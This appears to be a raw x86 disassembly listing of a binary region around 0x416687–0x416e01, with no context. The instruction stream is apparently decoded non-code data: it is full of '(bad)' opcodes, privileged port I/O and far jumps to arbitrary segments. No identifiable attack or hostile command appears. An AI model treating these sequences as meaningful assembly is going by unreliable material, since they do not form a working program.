  416687:	xor    DWORD PTR [edx-0x3ef498d6],esi
  41668d:	test   DWORD PTR [ebx],esp
  41668f:	or     BYTE PTR [ecx+ebx*4+0x274b25c4],ah
  416696:	fbstp  TBYTE PTR [esi+edi*8]
  416699:	mov    dh,cl
  41669b:	inc    eax
  41669c:	in     al,0xbf
  41669e:	ja     0x4166cc
  4166a0:	ja     0x41665b
  4166a2:	add    BYTE PTR [esi+eax*4],bl
  4166a5:	out    0xa3,al
  4166a7:	imul   esp,DWORD PTR [edi-0x25f7a2dd],0xf935f47
  4166b1:	jnp    0x416719
  4166b3:	pop    eax
  4166b4:	and    eax,DWORD PTR [esi]
  4166b6:	aad    0x8e
  4166b8:	outs   dx,DWORD PTR ds:[esi]
  4166b9:	sbb    BYTE PTR [ebx-0x4a],bh
  4166bc:	dec    eax
  4166bd:	xlat   BYTE PTR ds:[ebx]
  4166be:	dec    eax
  4166bf:	out    0xda,eax
  4166c1:	inc    esi
  4166c2:	add    bl,BYTE PTR [edi+0x67b1bab3]
  4166c8:	mov    gs,WORD PTR [ebp-0x25]
  4166cb:	clc    
  4166cc:	popa   
  4166cd:	scas   eax,DWORD PTR es:[edi]
  4166ce:	pop    ecx
  4166cf:	jmp    0x41670c
  4166d1:	mov    edi,0xbe7ac1c6
  4166d6:	pop    ebp
  4166d7:	stos   DWORD PTR es:[edi],eax
  4166d8:	jmp    0x2850:0x62c4d410
  4166df:	mov    ch,0xbe
  4166e1:	adc    eax,esp
  4166e3:	or     BYTE PTR [esi],0xa9
  4166e6:	pop    eax
  4166e7:	jmp    0x416711
  4166e9:	data16 int3 
  4166eb:	mov    al,0x76
  4166ed:	jb     0x41668a
  4166ef:	mov    esp,0xffb6b68b
  4166f4:	scas   al,BYTE PTR es:[edi]
  4166f5:	adc    eax,0x3b9c3858
  4166fa:	inc    ecx
  4166fb:	iret   
  4166fc:	rcr    DWORD PTR [ebx+0xe],1
  4166ff:	mov    esi,DWORD PTR [ecx]
  416701:	(bad)  
  416703:	mov    ah,0x51
  416705:	sub    al,0xba
  416707:	xor    BYTE PTR [edx+0x77],0x21
  41670b:	xor    al,0xaa
  41670d:	jnp    0x41677e
  41670f:	xor    BYTE PTR [edi+0x441fbb8d],cl
  416715:	dec    edi
  416716:	and    ebx,DWORD PTR ds:0x5154d5fd
  41671c:	popf   
  41671d:	add    BYTE PTR [edx+0x189ea2c],bl
  416723:	push   esp
  416724:	fdivr  DWORD PTR [esi-0x2a]
  416727:	xor    DWORD PTR [eax-0x4c],eax
  41672a:	jp     0x41674b
  41672c:	inc    ecx
  41672d:	arpl   WORD PTR [ecx+ebp*4-0x78c83bab],bp
  416734:	pop    es
  416735:	and    esp,DWORD PTR [edi+0x7c]
  416738:	fimul  WORD PTR [ebx-0x5e]
  41673b:	(bad)  
  41673c:	aas    
  41673d:	inc    ecx
  41673e:	dec    ebp
  41673f:	popf   
  416740:	xor    ebp,eax
  416742:	addr16 in al,0x91
  416745:	jp     0x416700
  416747:	call   0x29ba:0x9c56bd98
  41674e:	cwde   
  41674f:	pop    edx
  416750:	dec    esp
  416751:	mov    ds:0x7575ad9a,eax
  416756:	fild   WORD PTR [ebx+0x10]
  416759:	mov    ebp,0x7ffeac85
  41675e:	push   cs
  41675f:	es mov al,0x21
  416762:	xchg   esp,eax
  416763:	mov    esp,DWORD PTR gs:[edx+0x45]
  416767:	fs jle 0x416748
  41676a:	fmul   DWORD PTR [ecx]
  41676c:	retf   
  41676d:	or     BYTE PTR [edi-0x3],al
  416770:	or     DWORD PTR [eax-0x526d0595],edx
  416776:	xor    ah,BYTE PTR [ecx]
  416778:	fmulp  st(6),st
  41677a:	jg     0x4167d3
  41677c:	xchg   ebx,eax
  41677d:	xchg   ebp,eax
  41677e:	xchg   ebx,eax
  41677f:	(bad)  
  416780:	(bad)  
  416781:	cmp    al,0x3b
  416783:	push   0x8e2540ec
  416788:	mov    al,ds:0xe83698a3
  41678d:	std    
  41678e:	jo     0x41674c
  416790:	ret    0x1e1f
  416793:	mov    eax,ds:0xb20e598a
  416798:	(bad)  
  416799:	cdq    
  41679a:	sbb    BYTE PTR [esi],0x76
  41679d:	ss out 0xcb,al
  4167a0:	aad    0xef
  4167a2:	cmp    ah,BYTE PTR [edx-0x413f441d]
  4167a8:	mov    ds:0xdc9e3f6d,eax
  4167ad:	add    ebp,eax
  4167af:	ja     0x416782
  4167b1:	fisttp WORD PTR [ebx+0x5d0c0ecd]
  4167b7:	pop    esi
  4167b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167ba:	ret    0x8366
  4167bd:	clc    
  4167be:	mov    esp,0xfc7dced5
  4167c3:	fadd   DWORD PTR [eax]
  4167c5:	xchg   esp,eax
  4167c6:	mov    BYTE PTR [edi-0x5aedca1a],0x40
  4167cd:	pop    eax
  4167ce:	test   DWORD PTR [eax+0x11],esp
  4167d1:	sbb    edx,DWORD PTR ds:[eax]
  4167d4:	ret    0xf17b
  4167d7:	popf   
  4167d8:	fmulp  st(2),st
  4167da:	fist   DWORD PTR [ebx]
  4167dc:	leave  
  4167dd:	pop    ecx
  4167de:	push   0x77
  4167e0:	sbb    ebx,DWORD PTR [esi+0x45]
  4167e3:	sbb    BYTE PTR [eax],ah
  4167e5:	inc    edx
  4167e6:	pop    edx
  4167e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e8:	div    BYTE PTR [ebx]
  4167ea:	or     eax,0xa0a3adc8
  4167ef:	xchg   edx,eax
  4167f0:	push   esi
  4167f1:	sbb    DWORD PTR [ebp+0x26],eax
  4167f4:	xchg   edi,eax
  4167f5:	mov    eax,ds:0x29ea4273
  4167fa:	xor    esi,DWORD PTR [ebp+0x18f767d6]
  416800:	repz sub eax,0xd19537c2
  416806:	sub    al,cl
  416808:	inc    ebp
  416809:	lea    ebx,[esi+0x7291da7b]
  41680f:	dec    ebx
  416810:	repz scas eax,DWORD PTR es:[edi]
  416812:	xchg   ebp,eax
  416813:	pop    edi
  416814:	test   eax,0xe042164f
  416819:	jg     0x41679b
  41681b:	retf   0xe989
  41681e:	arpl   WORD PTR [ecx],bx
  416820:	gs test eax,0xcdd180e7
  416826:	mov    esi,0xfbbb7cdb
  41682b:	xor    esp,esi
  41682d:	leave  
  41682e:	in     al,0x10
  416830:	and    ah,BYTE PTR [ebp-0x6f]
  416833:	push   es
  416834:	mov    ch,dh
  416836:	add    ecx,DWORD PTR [ebp-0x7f]
  416839:	repnz push ss
  41683b:	lea    eax,[esi+ebp*8]
  41683e:	aas    
  41683f:	ret    
  416840:	out    0x7,al
  416842:	mov    eax,ds:0xb981562a
  416847:	imul   DWORD PTR [edx-0x152f653f]
  41684d:	pushf  
  41684e:	jge    0x416852
  416850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416851:	sbb    esp,esp
  416853:	sub    BYTE PTR [edx+0x5b],bh
  416856:	scas   eax,DWORD PTR es:[edi]
  416857:	adc    dl,BYTE PTR [edi+0x9]
  41685a:	adc    al,0xa2
  41685c:	in     eax,0xc3
  41685e:	dec    esi
  41685f:	outs   dx,BYTE PTR ds:[esi]
  416860:	out    0xe1,al
  416862:	and    bh,BYTE PTR [edx+0xbca85ee]
  416868:	lods   al,BYTE PTR ds:[esi]
  416869:	neg    cl
  41686b:	loop   0x4168a4
  41686d:	loope  0x4168b9
  41686f:	ds loop 0x4168af
  416872:	mov    ch,0x2f
  416874:	dec    ebx
  416875:	(bad)  
  416876:	mov    ah,0xc9
  416878:	lock dec ecx
  41687a:	aaa    
  41687b:	cmp    BYTE PTR [ebx+0x27f6105a],ch
  416881:	or     DWORD PTR ss:[ebx],esi
  416884:	cmp    BYTE PTR [edx+eax*8+0x60],ah
  416888:	bswap  eax
  41688a:	cmp    BYTE PTR [esi],cl
  41688c:	les    edi,FWORD PTR [ebp+edx*2+0x2f]
  416890:	ret    
  416891:	mov    bh,0x1b
  416893:	rcl    edx,cl
  416895:	mov    edi,0xc9257e57
  41689a:	jecxz  0x416873
  41689c:	sbb    edi,DWORD PTR [eax+ecx*2+0x7f956cd9]
  4168a3:	pop    edi
  4168a4:	scas   al,BYTE PTR es:[edi]
  4168a5:	lods   al,BYTE PTR ds:[esi]
  4168a6:	pop    edi
  4168a7:	and    ebp,esi
  4168a9:	adc    ebx,DWORD PTR [ecx-0x534ebaed]
  4168af:	in     al,dx
  4168b0:	fcmovbe st,st(7)
  4168b2:	xchg   edx,eax
  4168b3:	js     0x416902
  4168b5:	xor    DWORD PTR [ecx-0x1f2607c3],ebp
  4168bb:	ss dec eax
  4168bd:	icebp  
  4168be:	add    edi,DWORD PTR [eax]
  4168c0:	dec    eax
  4168c1:	pop    ebx
  4168c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168c3:	lock (bad) 
  4168c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168c6:	bound  esp,QWORD PTR [ecx-0x34]
  4168c9:	jg     0x416948
  4168cb:	cld    
  4168cc:	jns    0x4168e4
  4168ce:	pop    eax
  4168cf:	vmwrite edi,DWORD PTR [ecx-0x307e6f81]
  4168d6:	shl    BYTE PTR [ecx+ecx*8-0x31],1
  4168da:	add    esi,DWORD PTR [ebx]
  4168dc:	fst    DWORD PTR [edx]
  4168de:	jns    0x416864
  4168e0:	je     0x41692c
  4168e2:	aas    
  4168e3:	retf   
  4168e4:	add    edi,DWORD PTR [ebx+0x67]
  4168e7:	pop    ss
  4168e8:	sar    BYTE PTR ds:0x797c409,1
  4168ee:	adc    BYTE PTR [ebp-0x4ae8d7fd],al
  4168f4:	ror    BYTE PTR [ebp-0x77ec2d7],1
  4168fa:	ds and eax,0x193032ad
  416900:	jmp    0x4168e1
  416902:	les    ecx,FWORD PTR [ebx-0x1d]
  416905:	jmp    0x416887
  416907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416908:	fidiv  DWORD PTR [ecx-0xc6fc09d]
  41690e:	adc    DWORD PTR [esi+0x7c],ecx
  416911:	and    al,0x3b
  416913:	js     0x416910
  416915:	retf   
  416916:	jns    0x416987
  416918:	jne    0x41697f
  41691a:	add    DWORD PTR ds:0xff8a020b,eax
  416920:	add    ecx,DWORD PTR [ebp-0x68]
  416923:	or     BYTE PTR [edx+0x1e],0x7b
  416927:	rol    BYTE PTR [edx+0x14ad8760],0x98
  41692e:	imul   ebx,DWORD PTR [esi-0x50],0x4a9605d5
  416935:	es cmp cl,bl
  416938:	or     ch,ch
  41693a:	add    eax,0x4239ddd4
  41693f:	fwait
  416940:	bound  ecx,QWORD PTR [ebx+eax*1+0x2d83bcbf]
  416947:	pop    edi
  416948:	add    cl,BYTE PTR [esi-0x2f]
  41694b:	scas   eax,DWORD PTR es:[edi]
  41694c:	jp     0x4168ed
  41694e:	push   esi
  41694f:	repnz pop eax
  416951:	div    ecx
  416953:	adc    BYTE PTR [ecx+0xd7f335e],dl
  416959:	leave  
  41695a:	adc    ecx,DWORD PTR [ebx]
  41695c:	cmp    al,0xf2
  41695e:	or     al,0x28
  416960:	jno    0x416957
  416962:	aas    
  416963:	dec    eax
  416964:	mov    ds:0xb079da1c,eax
  416969:	test   edx,eax
  41696b:	scas   al,BYTE PTR es:[edi]
  41696c:	aam    0x76
  41696e:	jmp    0xf8c4:0xe1073696
  416975:	push   esp
  416976:	inc    ecx
  416977:	js     0x4169a2
  416979:	arpl   WORD PTR [ebp+0x2d],si
  41697c:	dec    ecx
  41697d:	sbb    DWORD PTR [ebp+0x33],0xfffffff5
  416981:	add    eax,0x30d23a92
  416986:	push   ds
  416987:	mov    edi,0x28e43ca6
  41698c:	pop    esp
  41698d:	or     bh,BYTE PTR [edx-0x4b59a766]
  416993:	cwde   
  416994:	outs   dx,DWORD PTR ds:[esi]
  416995:	outs   dx,DWORD PTR ds:[esi]
  416996:	sub    al,0x43
  416998:	in     al,dx
  416999:	jle    0x4169d7
  41699b:	in     eax,dx
  41699c:	je     0x416923
  41699e:	or     al,0x53
  4169a0:	lds    esi,FWORD PTR [eax+0x77]
  4169a3:	jb     0x416934
  4169a5:	sbb    eax,0xa9579f21
  4169aa:	sbb    ebx,ecx
  4169ac:	pop    ebx
  4169ad:	push   ss
  4169ae:	jae    0x416942
  4169b0:	outs   dx,BYTE PTR cs:[esi]
  4169b2:	nop
  4169b3:	cmc    
  4169b4:	or     BYTE PTR [eax],bh
  4169b6:	cmp    DWORD PTR [ebx],edi
  4169b8:	(bad)  
  4169b9:	fcmovnbe st,st(2)
  4169bb:	rol    DWORD PTR [ebp-0x71d7ebfe],0x96
  4169c2:	popf   
  4169c3:	inc    edi
  4169c4:	into   
  4169c5:	mov    dl,0xab
  4169c7:	sti    
  4169c8:	dec    ecx
  4169c9:	fwait
  4169ca:	outs   dx,BYTE PTR ds:[esi]
  4169cb:	sbb    ecx,ebp
  4169cd:	or     ch,BYTE PTR [ecx]
  4169cf:	lods   eax,DWORD PTR ds:[esi]
  4169d0:	rol    DWORD PTR [edx-0x48],cl
  4169d3:	mov    ecx,0x36755173
  4169d8:	xchg   edx,eax
  4169d9:	lods   eax,DWORD PTR ds:[esi]
  4169da:	mov    bh,0xef
  4169dc:	not    DWORD PTR [esi+0x39710600]
  4169e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169e3:	call   0x9963cfe6
  4169e8:	retf   0x7716
  4169eb:	jnp    0x4169ce
  4169ed:	jae    0x4169bb
  4169ef:	test   al,0x58
  4169f1:	mov    ah,0xf1
  4169f3:	xchg   ecx,eax
  4169f4:	ins    BYTE PTR es:[edi],dx
  4169f5:	retf   
  4169f6:	leave  
  4169f7:	ins    BYTE PTR es:[edi],dx
  4169f8:	ror    bh,0x82
  4169fb:	out    0x65,eax
  4169fd:	inc    ecx
  4169fe:	push   0x5e
  416a00:	scas   al,BYTE PTR es:[edi]
  416a01:	scas   al,BYTE PTR es:[edi]
  416a02:	adc    DWORD PTR [ecx+ebp*8+0xd580725],eax
  416a09:	push   0x49
  416a0b:	hlt    
  416a0c:	mov    dh,0x3f
  416a0e:	dec    esp
  416a0f:	mov    eax,0xe5d3474c
  416a14:	pop    edi
  416a15:	rol    DWORD PTR [ebx],0x25
  416a18:	pop    ebp
  416a19:	fs (bad) 
  416a1c:	pushf  
  416a1d:	and    DWORD PTR [ebx+0x58],ebp
  416a20:	in     eax,0x48
  416a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a23:	aam    0xb1
  416a25:	jnp    0x416a7f
  416a27:	das    
  416a28:	cmp    al,0xb0
  416a2a:	(bad)
  416a2d:	ror    DWORD PTR [ecx+0x1d],cl
  416a30:	xlat   BYTE PTR ds:[ebx]
  416a32:	mov    edi,0x34d2a96f
  416a37:	fwait
  416a38:	leave  
  416a39:	push   esi
  416a3a:	inc    ebp
  416a3b:	ret    0x1b4a
  416a3e:	pop    edi
  416a3f:	add    ch,BYTE PTR [ebp+0x629c591a]
  416a45:	inc    eax
  416a46:	(bad)
  416a49:	cmp    edi,DWORD PTR [eax+ebx*4+0x33a3c1a]
  416a50:	jmp    FWORD PTR [ecx+0x6e088caa]
  416a56:	sub    cl,dl
  416a58:	pop    ebp
  416a59:	mov    BYTE PTR [eax+0x22],al
  416a5c:	icebp  
  416a5d:	sub    ebx,DWORD PTR [ebx+0x11]
  416a60:	pop    edx
  416a61:	jb     0x4169f6
  416a63:	pop    edx
  416a64:	push   edx
  416a65:	outs   dx,DWORD PTR ds:[esi]
  416a66:	loop   0x416a28
  416a68:	add    BYTE PTR [ebp-0x37],bh
  416a6b:	inc    ebx
  416a6c:	adc    ecx,DWORD PTR [edx+0x7322ed04]
  416a72:	sar    BYTE PTR ss:[ecx+0x7ec30bf3],1
  416a79:	mov    ch,0x78
  416a7b:	rcl    DWORD PTR [ebx-0x447486fb],1
  416a81:	out    dx,al
  416a82:	add    BYTE PTR [esi],bl
  416a84:	cmc    
  416a85:	fnstsw WORD PTR [ecx+eiz*2+0x73]
  416a89:	mov    al,0x69
  416a8b:	rcr    ebp,0x42
  416a8e:	into   
  416a8f:	les    esi,FWORD PTR [ebp-0x43a8f2b9]
  416a95:	xchg   ebp,eax
  416a96:	rol    bh,cl
  416a98:	and    bl,ch
  416a9a:	cmp    DWORD PTR [ebx-0x2a],esp
  416a9d:	mov    WORD PTR [eax+0x70c2f235],ss
  416aa3:	les    eax,FWORD PTR [eax+0x74bc39af]
  416aa9:	push   0x76
  416aab:	dec    esp
  416aac:	aad    0xe
  416aae:	adc    DWORD PTR [ebp-0x30],ecx
  416ab1:	in     al,dx
  416ab2:	and    eax,DWORD PTR [ebp+0x133df17e]
  416ab8:	stc    
  416ab9:	mov    ebx,0x3507749
  416abe:	push   eax
  416abf:	and    ah,bh
  416ac1:	imul   esp,DWORD PTR [edi],0xbb63e82c
  416ac7:	mov    dl,0x63
  416ac9:	xor    dl,BYTE PTR [esi+0x74]
  416acc:	xlat   BYTE PTR ds:[ebx]
  416acd:	mov    ecx,0xeff36a3c
  416ad2:	ins    BYTE PTR es:[edi],dx
  416ad3:	popf   
  416ad4:	pushf  
  416ad5:	add    BYTE PTR [edx+0x3c],bh
  416ad8:	push   0xfffffffb
  416ada:	xchg   edi,eax
  416adb:	push   ecx
  416adc:	cmp    edx,DWORD PTR [ebx-0x47]
  416adf:	xchg   cl,ch
  416ae1:	and    al,0xa1
  416ae3:	fcomp  DWORD PTR [ecx-0x4c]
  416ae6:	shr    ecx,cl
  416ae8:	retf   
  416ae9:	adc    al,0x59
  416aeb:	outs   dx,BYTE PTR ds:[esi]
  416aec:	dec    esi
  416aed:	call   edi
  416aef:	test   DWORD PTR [esi],ebx
  416af1:	push   cs
  416af2:	cld    
  416af3:	shl    ch,cl
  416af5:	or     eax,DWORD PTR [ebp-0x32]
  416af8:	mov    cl,0x37
  416afa:	ins    DWORD PTR es:[edi],dx
  416afb:	in     al,0xef
  416afd:	cs gs pop esi
  416b00:	enter  0xd02f,0x65
  416b04:	or     eax,0x561f058a
  416b09:	pushf  
  416b0a:	dec    esp
  416b0b:	rcr    DWORD PTR [edi],0x97
  416b0e:	int    0xdd
  416b10:	add    al,0x40
  416b12:	shr    al,0xcd
  416b15:	iret   
  416b16:	sub    ch,0xb7
  416b19:	js     0x416acd
  416b1b:	rol    DWORD PTR [esi],cl
  416b1d:	pushw  cs
  416b1f:	inc    ebx
  416b20:	fsubr  DWORD PTR [esi+0x78]
  416b23:	pop    eax
  416b24:	lds    edx,FWORD PTR [ebp-0xf]
  416b27:	arpl   WORD PTR ds:0xb2323501,dx
  416b2d:	call   0x5507:0x68dec797
  416b34:	lea    ebx,[edx+0x48]
  416b37:	sar    DWORD PTR [eax],1
  416b39:	mov    ebp,0x86826d7e
  416b3e:	div    BYTE PTR ds:0xe907f094
  416b44:	mov    fs,WORD PTR [edx+eax*1+0x76]
  416b48:	dec    ebx
  416b49:	xchg   esp,eax
  416b4a:	(bad)  
  416b4b:	fild   DWORD PTR [ebx-0x52]
  416b4e:	jae    0x416bac
  416b50:	js     0x416b89
  416b52:	dec    ebx
  416b53:	adc    DWORD PTR [edx-0xe9f5268],edi
  416b59:	sub    edi,esi
  416b5b:	int    0x56
  416b5d:	xchg   edi,eax
  416b5e:	cdq    
  416b5f:	add    dl,cl
  416b61:	pop    esi
  416b62:	xchg   DWORD PTR [eax],ebp
  416b64:	adc    ecx,DWORD PTR [ebp+0x75]
  416b67:	or     DWORD PTR [esp+eax*8+0x76],ecx
  416b6b:	dec    esi
  416b6c:	mov    esi,0x4bdfa9b8
  416b71:	push   edx
  416b72:	pop    ds
  416b73:	and    DWORD PTR [ecx],0x49
  416b76:	push   ecx
  416b77:	ss in  al,dx
  416b79:	xor    bl,ch
  416b7b:	cwde   
  416b7c:	cmp    esi,0x371b7db4
  416b82:	cdq    
  416b83:	sub    eax,0xf1d713f
  416b88:	jmp    0xb46c:0xff7dddbc
  416b8f:	int    0x24
  416b91:	mov    DWORD PTR [edx],ebx
  416b93:	xchg   ecx,eax
  416b94:	ds cld 
  416b96:	rcl    DWORD PTR [ebx+0xb],1
  416b99:	pop    ebx
  416b9a:	sbb    esi,DWORD PTR [ecx+0x1be0b91a]
  416ba0:	xchg   esi,eax
  416ba1:	outs   dx,BYTE PTR ds:[esi]
  416ba2:	dec    esi
  416ba3:	iret   
  416ba4:	mov    esi,0x269efbb9
  416ba9:	or     al,0x1a
  416bab:	xor    esp,esp
  416bad:	and    DWORD PTR [ebx],esi
  416baf:	out    0x69,eax
  416bb1:	arpl   WORD PTR [eax+0x216d3bac],ax
  416bb7:	lea    ecx,[edx-0x3]
  416bba:	aas    
  416bbb:	data16 test al,0x4
  416bbe:	lods   al,BYTE PTR ds:[esi]
  416bbf:	fild   WORD PTR [edx+0x4420cd16]
  416bc5:	cmp    esi,DWORD PTR [edx+0x51682d94]
  416bcb:	or     ebp,DWORD PTR [ebp-0x4fc78f54]
  416bd1:	cmp    al,0xf2
  416bd3:	stos   DWORD PTR es:[edi],eax
  416bd4:	push   es
  416bd5:	adc    al,BYTE PTR [ebx+0x150186fe]
  416bdb:	pop    ss
  416bdc:	fild   QWORD PTR [edx+esi*2-0x44]
  416be0:	ins    BYTE PTR es:[edi],dx
  416be1:	mov    edx,0xfdab7e32
  416be6:	jne    0x416c51
  416be8:	pop    esp
  416be9:	iret   
  416bea:	inc    ebp
  416beb:	mov    cl,0x39
  416bed:	iret   
  416bee:	jg     0x416bfb
  416bf0:	sahf   
  416bf1:	mov    ds:0x80ccffd4,eax
  416bf6:	daa    
  416bf7:	dec    esp
  416bf8:	ss pop ebx
  416bfa:	repz cmp ebp,DWORD PTR [ebx]
  416bfd:	mov    bh,0xe3
  416bff:	add    BYTE PTR [esi+0xfcaf00d],0xe8
  416c06:	pop    edi
  416c07:	fst    DWORD PTR [edx-0x7f]
  416c0a:	pusha  
  416c0b:	add    bh,BYTE PTR [edi+0x6f2171b5]
  416c11:	hlt    
  416c12:	bnd js 0x416bc6
  416c15:	int    0xbb
  416c17:	pusha  
  416c18:	or     ebx,DWORD PTR [ebx+eiz*2]
  416c1b:	cld    
  416c1c:	and    eax,0xd05eaaa2
  416c21:	dec    ebx
  416c22:	push   esi
  416c23:	pop    es
  416c24:	jge    0x416c18
  416c26:	mov    DWORD PTR [esi],ebp
  416c28:	scas   al,BYTE PTR es:[edi]
  416c29:	cli    
  416c2a:	sbb    eax,0x18312596
  416c2f:	in     al,0xb3
  416c31:	cdq    
  416c32:	xor    DWORD PTR [eax],ebx
  416c34:	or     al,0xf4
  416c36:	(bad)  
  416c37:	aad    0x56
  416c39:	fisub  DWORD PTR [eax]
  416c3b:	sub    DWORD PTR [edi-0x25e0cf68],0x28
  416c42:	sbb    eax,0x978c6068
  416c47:	cmp    al,0xef
  416c49:	ret    
  416c4a:	adc    BYTE PTR [ebx+0x62f7f04d],0x42
  416c51:	cld    
  416c52:	jno    0x416c6c
  416c54:	push   esi
  416c55:	sub    bh,BYTE PTR [ecx-0x720848c5]
  416c5b:	push   esi
  416c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c5d:	adc    edi,esi
  416c5f:	int3   
  416c60:	cmp    DWORD PTR [edx-0x596b621e],edi
  416c66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c67:	popa   
  416c68:	pop    eax
  416c69:	cmp    dl,BYTE PTR [esi]
  416c6b:	inc    edx
  416c6c:	outs   dx,BYTE PTR ds:[esi]
  416c6d:	popa   
  416c6e:	mov    cl,0xd4
  416c70:	std    
  416c71:	xor    eax,0x96577257
  416c76:	push   ebp
  416c77:	arpl   WORD PTR [ecx+0x22bc37c3],di
  416c7d:	cld    
  416c7e:	jge    0x416cca
  416c80:	ds mov dl,0x7b
  416c83:	inc    esi
  416c84:	in     eax,0xff
  416c86:	ret    0x64f8
  416c89:	xor    eax,0xa8d44851
  416c8e:	test   DWORD PTR [esp+eax*4],edi
  416c91:	stos   DWORD PTR es:[edi],eax
  416c92:	add    ah,BYTE PTR [ebx]
  416c94:	or     DWORD PTR [esi+0x5277f6e5],ebp
  416c9a:	shl    bh,cl
  416c9c:	cmp    dl,BYTE PTR [esi-0x5347a5f7]
  416ca2:	daa    
  416ca3:	pop    es
  416ca4:	mov    BYTE PTR [edi],dl
  416ca6:	cmp    DWORD PTR [esi-0x48],edi
  416ca9:	or     DWORD PTR [ecx],ebx
  416cab:	mov    dh,0xe2
  416cad:	retf   
  416cae:	pop    es
  416caf:	or     edi,esi
  416cb1:	or     ch,bh
  416cb3:	fist   DWORD PTR [ebp-0x57]
  416cb6:	fild   WORD PTR [ecx-0x76]
  416cb9:	ins    DWORD PTR es:[edi],dx
  416cba:	jbe    0x416c8a
  416cbc:	mov    edi,0x3661383b
  416cc1:	xor    dl,dl
  416cc3:	pop    eax
  416cc4:	dec    edx
  416cc5:	stos   BYTE PTR es:[edi],al
  416cc6:	aas    
  416cc7:	pop    esp
  416cc8:	push   ebp
  416cc9:	cmp    ah,cl
  416ccb:	xchg   esp,eax
  416ccc:	call   0x383c:0x72a888f1
  416cd3:	cdq    
  416cd4:	mov    eax,ds:0xa2af7b1a
  416cd9:	pop    esp
  416cda:	jne    0x416d20
  416cdc:	push   ecx
  416cdd:	stc    
  416cde:	pop    ss
  416cdf:	cmp    esp,DWORD PTR [eax]
  416ce1:	xlat   BYTE PTR ds:[ebx]
  416ce2:	or     DWORD PTR [ebp+eax*2-0x70],esp
  416ce6:	sar    BYTE PTR [edi],1
  416ce8:	mov    dl,0x18
  416cea:	and    cl,dh
  416cec:	popf   
  416ced:	mov    cl,0xde
  416cef:	push   0xffffff9c
  416cf1:	pop    ebp
  416cf2:	pop    edi
  416cf3:	push   ss
  416cf4:	push   edi
  416cf5:	mov    ah,0xd9
  416cf7:	add    al,0x7c
  416cf9:	js     0x416d27
  416cfb:	sbb    ah,al
  416cfd:	sub    eax,ebx
  416cff:	call   DWORD PTR [ecx+0x5ab5e868]
  416d05:	dec    esi
  416d06:	inc    edx
  416d07:	adc    esp,0xf6c737ca
  416d0d:	test   BYTE PTR [edx],ch
  416d0f:	jp     0x416cb6
  416d11:	jmp    FWORD PTR [esi]
  416d13:	arpl   WORD PTR [eax+ecx*1-0x45],di
  416d17:	lods   al,BYTE PTR ds:[esi]
  416d18:	sub    bl,BYTE PTR [ebx+eiz*2+0x1da424ac]
  416d1f:	and    al,BYTE PTR [ebp+0x3ddf6a0c]
  416d25:	pop    eax
  416d26:	cli    
  416d27:	ins    DWORD PTR es:[edi],dx
  416d28:	mov    edi,0xd1424806
  416d2d:	in     al,dx
  416d2e:	mov    ch,0x47
  416d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d31:	pop    es
  416d32:	icebp  
  416d33:	les    edx,FWORD PTR [eax-0x1c]
  416d36:	mov    ds:0x5f17672f,al
  416d3b:	or     al,0x7b
  416d3d:	xor    ebp,edx
  416d3f:	or     ch,dh
  416d41:	fs mov bl,0xb5
  416d44:	dec    ebp
  416d45:	cs add eax,0xaed4ce5e
  416d4b:	add    al,0x10
  416d4d:	inc    edi
  416d4e:	mov    DWORD PTR ds:0xef37f2ef,ecx
  416d54:	mov    ch,0x23
  416d56:	clc    
  416d57:	mov    bl,0x8b
  416d59:	stc    
  416d5a:	lea    ebp,[edi]
  416d5c:	jmp    0x87134cf3
  416d61:	jge    0x416d14
  416d63:	in     al,dx
  416d64:	adc    eax,0x577cb1db
  416d69:	push   ebp
  416d6a:	jne    0x416d8b
  416d6c:	dec    edi
  416d6d:	cmp    eax,0x39ce8274
  416d72:	(bad)  
  416d74:	inc    esi
  416d75:	rcl    BYTE PTR [ecx-0xb0ada67],0x52
  416d7c:	or     DWORD PTR [esi+ecx*1+0x4c],0xde1703e2
  416d84:	(bad)  
  416d85:	gs jae 0x416df8
  416d88:	outs   dx,BYTE PTR ds:[esi]
  416d89:	jnp    0x416dc4
  416d8b:	pop    edi
  416d8c:	into   
  416d8d:	mov    esi,0x21407411
  416d92:	imul   bl
  416d94:	adc    BYTE PTR [edi-0xa825447],0x8b
  416d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d9c:	mov    dh,0xde
  416d9e:	fldcw  WORD PTR [edi]
  416da0:	jo     0x416dbe
  416da2:	sbb    DWORD PTR [edi+0x7726d4ef],esp
  416da8:	fs and al,0xb6
  416dab:	mov    bl,0xde
  416dad:	and    al,0x7d
  416daf:	inc    esi
  416db0:	out    dx,al
  416db1:	adc    cl,BYTE PTR [edi+esi*8-0x79]
  416db5:	jns    0x416e26
  416db7:	push   ebx
  416db8:	es pop ebx
  416dba:	pop    ds
  416dbb:	pop    esp
  416dbc:	jge    0x416e25
  416dbe:	mov    WORD PTR [ebx+0x13c214c1],gs
  416dc4:	out    dx,eax
  416dc5:	out    0x4a,al
  416dc7:	stos   DWORD PTR es:[edi],eax
  416dc8:	or     al,0x33
  416dca:	pop    edi
  416dcb:	sbb    BYTE PTR [edi],ah
  416dcd:	jmp    0x538e:0xbf226277
  416dd4:	ins    DWORD PTR es:[edi],dx
  416dd5:	popa   
  416dd6:	fstp   DWORD PTR [ebx+0x25]
  416dd9:	repnz pop ss
  416ddb:	das    
  416ddc:	inc    esi
  416ddd:	jl     0x416dae
  416ddf:	mov    esi,0x7d6c7588
  416de4:	in     al,0x3d
  416de6:	or     BYTE PTR [edi],ah
  416de8:	jmp    0xd373e2e9
  416ded:	fld    DWORD PTR [ebp-0xa2fc09c]
  416df3:	into   
  416df4:	xchg   edx,eax
  416df5:	dec    ecx
  416df6:	mov    ecx,0x6da5467f
  416dfb:	mov    ecx,DWORD PTR [edi+0x78347d29]
  416e01:	jp     0x416ded
